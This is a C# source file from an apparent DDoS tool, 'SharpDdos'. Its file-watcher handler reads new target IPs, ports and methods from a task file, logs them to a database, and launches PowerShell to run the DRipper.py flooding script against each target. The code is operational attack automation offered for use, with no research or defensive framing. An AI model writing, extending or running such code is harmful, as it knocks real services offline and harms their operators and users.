using System.Diagnostics;


namespace SharpDdos.Handlers
{
    internal static class FileChangedHandler
    {
        internal static void OnChanged(object source, FileSystemEventArgs e)
        {
            var actionType = e.ChangeType;

            if (actionType != WatcherChangeTypes.Changed &&
                actionType != WatcherChangeTypes.Created)
            {
                return;
            }

            Console.WriteLine($"File was {actionType}");

            var targetService = new TargetService(Constants.DB_PATH, Constants.TARGET_TASK_PATH);

            var newTargets = targetService.GetUniqueTargets();

            if (newTargets.Count == 0)
            {
                Console.WriteLine($"No new targets found (maybe they were used before)!");
                return;
            }

            targetService.WriteTargetToDB(newTargets);

            RunScriptForTargets(newTargets);
        }

        private static void RunScriptForTargets(List<Target> newTargets)
        {
            foreach (var target in newTargets)
            {
                Console.WriteLine($"DRypper started for {target.IpAddress}:{target.Method}/{target.Port} ");
                RunPowershell(target);
            }
        }

        private static void RunPowershell(Target target)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo(Constants.POWER_SHELL_PATH);
            startInfo.ArgumentList.Add("-noexit");
            startInfo.ArgumentList.Add($"python DRipper.py -s {target.IpAddress}  -p {target.Port} -t 1500 -m {target.Method}");
            startInfo.CreateNoWindow = false;
            startInfo.RedirectStandardOutput = false;
            startInfo.RedirectStandardError = false;
            startInfo.UseShellExecute = true;
            startInfo.WindowStyle = ProcessWindowStyle.Normal;
            Process.Start(startInfo);
        }

        internal static void OnCreated(object sender, FileSystemEventArgs e)
        {
            OnChanged(sender, e);
        }

        internal static void OnError(object sender, ErrorEventArgs e) =>
            PrintException(e.GetException());

        private static void PrintException(Exception? ex)
        {
            if (ex != null)
            {
                Console.WriteLine($"Message: {ex.Message}");
                Console.WriteLine("Stacktrace:");
                Console.WriteLine(ex.StackTrace);
                Console.WriteLine();
                PrintException(ex.InnerException);
            }
        }
    }
}
